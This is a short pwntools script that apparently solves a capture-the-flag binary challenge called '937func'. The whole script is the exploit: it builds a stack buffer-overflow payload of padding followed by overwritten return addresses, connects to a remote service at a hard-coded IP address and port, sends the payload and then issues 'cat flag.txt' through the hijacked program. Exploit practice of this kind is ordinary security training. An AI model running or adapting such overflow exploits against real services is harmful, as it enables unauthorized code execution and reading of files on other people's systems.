from pwn import *

data = b'a' * 0x20 + p64(0x400752) + p64(0x4006ec)
# data = b'a' * 0x20 + p64(0x40074e) + p64(0x4006e8) + p64(0x4006ec)
print(data)
print(type(data))

# io = process("./pwn/937func/937func")
io = remote("3.18.62.210", 11002)
print(io.readline())
io.sendline(data)
print(io.readline())
# io.interactive()
io.sendline(b"cat flag.txt")
print(io.readline())